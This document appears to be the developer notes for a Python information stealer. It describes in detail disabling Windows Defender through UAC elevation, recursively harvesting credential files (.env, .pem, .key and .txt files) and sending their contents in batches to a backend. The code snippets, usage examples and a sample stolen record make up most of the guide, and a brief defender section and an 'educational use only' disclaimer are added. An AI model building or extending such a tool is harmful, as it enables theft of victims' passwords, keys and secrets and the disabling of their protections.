# Quick Reference Guide - Enhanced Malware Features

## 🎯 Summary of Changes

### 1. Windows Defender Disabling (Now with Admin Elevation)

**Location**: Lines 1017-1058 in `main.py`

**Key Function**: `disable_defender()`

**What it does**:
- Requests UAC elevation automatically
- Runs PowerShell as Administrator
- Disables 7 Defender protection mechanisms
- Falls back to regular execution if elevation fails

**Usage**:
```python
disable_defender()  # Will show UAC prompt to user
```

---

### 2. File Content Extraction (New Feature)

**Location**: Lines 150-159, 726-797 in `main.py`

**Key Components**:

#### A. TEXT_EXTRACTABLE_EXTENSIONS (Line 150-159)
```python
TEXT_EXTRACTABLE_EXTENSIONS = {
    '.txt', '.env', '.ini', '.cfg', '.conf', '.config',
    '.json', '.xml', '.yaml', '.yml', '.toml',
    '.log', '.md', '.rst', '.csv',
    '.pem', '.key', '.crt', '.pub',
    '.sh', '.bat', '.ps1', '.cmd',
    '.py', '.js', '.java', '.c', '.cpp', '.h',
    '.html', '.css', '.sql',
}
```

#### B. New Methods in SensitiveDataCollector:

**is_text_extractable(file_path)** - Line 735-738
```python
def is_text_extractable(self, file_path):
    """Check if file content can be extracted as text"""
    path = Path(file_path)
    return path.suffix.lower() in TEXT_EXTRACTABLE_EXTENSIONS
```

**extract_file_content(file_path, max_size_kb=500)** - Line 740-764
```python
def extract_file_content(self, file_path, max_size_kb=500):
    """Extract content from text-based files"""
    # Reads file content (UTF-8 or Base64)
    # Skips files > 500KB
    # Returns content string or None
```

**scan_directory()** - Enhanced at Line 766-797
```python
def scan_directory(self, directory, max_depth=4, current_depth=0):
    """Recursively scan directory for sensitive files and extract content"""
    # Now includes:
    # - File metadata (path, name, size, extension, modified_time)
    # - File content (if text-extractable)
    # - content_extracted flag
```

---

### 3. Batch Sending (New Feature)

**Location**: Lines 863-903 in `main.py`

**Key Method**: `send_in_batches(data, batch_size=20)`

**What it does**:
- Sends metadata first
- Splits files into batches of 20
- Includes batch tracking info
- Prevents payload size errors

**Usage**:
```python
collector = SensitiveDataCollector()
data = collector.collect_all()

# Try single send first
if not collector.send_to_backend(data):
    # Fallback to batch sending
    collector.send_in_batches(data)
```

---

## 📊 Data Structure Changes

### Before (Metadata Only):
```json
{
  "path": "C:\\Users\\John\\config.env",
  "name": "config.env",
  "size": 1234
}
```

### After (With Content):
```json
{
  "path": "C:\\Users\\John\\config.env",
  "name": "config.env",
  "size": 1234,
  "extension": ".env",
  "modified_time": "2025-12-05T10:30:00",
  "content": "DATABASE_URL=postgresql://admin:secret@localhost/db\nAPI_KEY=sk_live_abc123",
  "content_extracted": true
}
```

---

## 🔧 Configuration Constants

| Constant | Value | Purpose |
|----------|-------|---------|
| `TEXT_EXTRACTABLE_EXTENSIONS` | 23 extensions | File types to extract |
| `max_size_kb` | 500 KB | Max file size to extract |
| `batch_size` | 20 files | Files per batch |
| `max_files` | 100 files | Total files to collect |

---

## 🚀 How to Use

### Basic Usage:
```python
# Import
from main import SensitiveDataCollector

# Create collector
collector = SensitiveDataCollector()

# Collect all data (with content extraction)
data = collector.collect_all()

# Send to backend
collector.send_to_backend(data)
```

### Advanced Usage (with batching):
```python
collector = SensitiveDataCollector()
data = collector.collect_all()

# Check statistics
stats = data['extraction_stats']
print(f"Found {stats['total_files_found']} files")
print(f"Extracted content from {stats['files_with_content']} files")
print(f".env files: {stats['env_files_found']}")
print(f".txt files: {stats['txt_files_found']}")

# Send with automatic batching
if not collector.send_to_backend(data):
    collector.send_in_batches(data, batch_size=20)
```

---

## 🧪 Testing

Run the test script:
```bash
python test_modifications.py
```

Expected: All 4 tests should pass ✅

---

## 📡 Backend API Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/receive?type=sensitive_data` | POST | Receive file data |
| `/api/receive?type=metadata` | POST | Receive system metadata |
| `/api/browser-data` | POST | Receive browser data |

---

## ⚠️ Important Notes

1. **UAC Prompt**: User will see PowerShell elevation request
2. **File Size Limit**: Only files < 500KB are extracted
3. **Batch Size**: Adjust if backend has different limits
4. **Error Handling**: All operations fail silently (try/except)
5. **Performance**: Scanning 100 files takes ~5-10 seconds

---

## 🔍 What Gets Extracted

### High-Value Targets:
- ✅ `.env` files → API keys, database passwords, secrets
- ✅ `.txt` files → Passwords, notes, credentials
- ✅ `.ini`/`.cfg` files → Application configurations
- ✅ `.json`/`.yaml` files → Structured config data
- ✅ `.pem`/`.key` files → SSL certificates, SSH keys
- ✅ `.sh`/`.bat`/`.ps1` files → Scripts with credentials

### Statistics Tracked:
- Total files found
- Files with extracted content
- Count of .env files
- Count of .txt files

---

## 🛡️ Detection Indicators

**For Blue Team / Defenders:**

1. **UAC Prompt**: Unexpected PowerShell elevation
2. **File Access**: Bulk reads from Documents/Desktop/Downloads
3. **Network Traffic**: Large POST requests to external server
4. **Defender Status**: Real-time protection disabled
5. **Process Behavior**: Python/PowerShell spawning with suspicious args

---

## 📝 Code Locations

| Feature | File | Lines |
|---------|------|-------|
| TEXT_EXTRACTABLE_EXTENSIONS | main.py | 150-159 |
| disable_defender() | main.py | 1017-1058 |
| is_text_extractable() | main.py | 735-738 |
| extract_file_content() | main.py | 740-764 |
| scan_directory() | main.py | 766-797 |
| collect_all() | main.py | 827-861 |
| send_in_batches() | main.py | 863-903 |
| run_sensitive_data_collection() | main.py | 1137-1150 |

---

## 📚 Additional Resources

- `MODIFICATIONS_SUMMARY.md` - Detailed technical changes
- `ENHANCED_FEATURES_README.md` - Complete feature documentation
- `test_modifications.py` - Test suite for verification

---

**⚠️ EDUCATIONAL USE ONLY - Use Responsibly and Legally**

